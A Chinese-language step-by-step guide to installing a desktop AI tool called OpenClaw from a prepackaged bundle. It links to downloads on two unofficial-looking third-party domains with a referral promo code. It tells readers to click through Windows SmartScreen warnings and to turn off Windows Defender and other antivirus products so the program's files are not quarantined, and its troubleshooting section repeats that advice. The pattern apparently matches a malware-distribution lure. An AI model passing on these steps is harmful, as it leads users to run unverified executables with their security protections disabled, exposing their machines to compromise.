# 不用输入终端指令！Windows/Mac双端OpenClaw可视化部署，五分钟搭建本地AI工具
OpenClaw适配Windows、Mac两款主流桌面操作系统，支持图形界面一站式部署，全程不需要手动输入代码、不用自行下载配置各类运行依赖。按照下文分步指引操作，仅需五分钟就能完成本地智能体搭建，快速体验软件全部交互与自动化功能。

## 零基础五分钟搭建OpenClaw完整步骤
### 1. 下载对应系统专用整合资源包
打开浏览器，根据自身设备操作系统选择适配的下载链接获取压缩资源包：
Windows 版本：https://xiake.yun/api/download/package/18?promoCode=IV4E9B04A80C
苹果系统版本：https://openclaw.ikidi.top/api/download/package/35?promoCode=IV4E9B04A80C

该整合资源包整体大小为45.8MB，下载完毕后建议保存到D盘、E盘等非系统分区文件夹内。

### 2. 规范解压资源并启动安装程序
系统自带解压工具稳定性较差，解压过程容易出现文件缺失、目录错乱、资源损坏等问题，推荐使用7-Zip、WinRAR专业解压软件处理压缩包。
右键下载完成的压缩文件，选择解压至当前文件夹，解压结束后打开生成的独立程序文件夹。
在目录内找到带有红色龙虾标识的启动程序，双击运行开启软件。

如果系统弹出SmartScreen安全拦截提示框，依次点击弹窗内「更多信息」、「仍要运行」，即可正常加载程序。

程序启动后自动跳转OpenClaw安装引导页面，点击开始使用进入参数配置页面。
#### 安装目录设置标准
1. 文件夹名称必须全部为英文，禁止出现中文、空格、特殊标点符号
2. Windows设备推荐存放目录：D:\OpenClaw
3. 不建议选择C盘作为安装位置，长期运行会占用系统磁盘存储空间

勾选用户服务协议与免责声明内容，点击对应按钮启动自动化安装流程。
开始安装前建议彻底关闭360安全卫士、腾讯电脑管家、火绒、Windows Defender等防护程序，避免软件核心运行文件被隔离拦截，造成安装流程异常中断。

### 3. 等待系统全自动完成部署配置
点击安装按钮后无需人工进行任何操作，软件后台自动完成整套部署工作，整体耗时3至5分钟，同步执行以下流程：
1. 检测当前电脑系统基础运行环境
2. 自动补齐系统缺失的各类依赖组件
3. 部署OpenClaw 2.7.9全套核心项目文件
4. 配置配套浏览器自动化控制组件
5. 生成适配本机系统的专属配置文档
6. 录入本地安装信息，自动生成桌面快捷启动图标

部署运行阶段不要关闭程序窗口，中途关闭会直接中断部署，需要重新从头执行安装流程。

### 4. 软件启动与网关初始化操作
整套安装流程执行完毕后，软件会自动弹出启动界面，第一次启动时Gateway网关服务需要加载全部初始化资源，页面会提示「正在等待Gateway就绪」，等待1至3分钟就能完成资源加载。

当软件主界面右上角出现Gateway在线标识，代表初始化工作完成，可正常使用全部功能。

### 5. 软件界面板块与基础使用说明
- 右上角板块：查看网关实时运行状态、一键重启服务、调取完整程序运行日志
- 左侧功能栏：自由切换本地运行、渠道接入两种模式，查看全部历史对话记录
- 底部输入区域：输入自然语言指令，按下Enter键即可发送内容完成交互

软件额外支持多种大模型自由切换、代码片段高亮显示、长期保存历史对话记录等实用功能。

### 6. 安装、启动阶段常见问题处理办法
1. 软件启动失败：检查电脑网络连通状态，或者完整重新执行一遍安装流程
2. 安装中途报错终止：确认所有安全防护软件已经完全关闭，关闭后重新尝试安装
3. 软件运行出现卡顿延迟：将整个OpenClaw文件夹移动至磁盘剩余存储空间充足的分区
4. 第一次启动加载速度偏慢：属于资源初始化正常现象，等待加载完成后，后续开启软件速度会明显提升
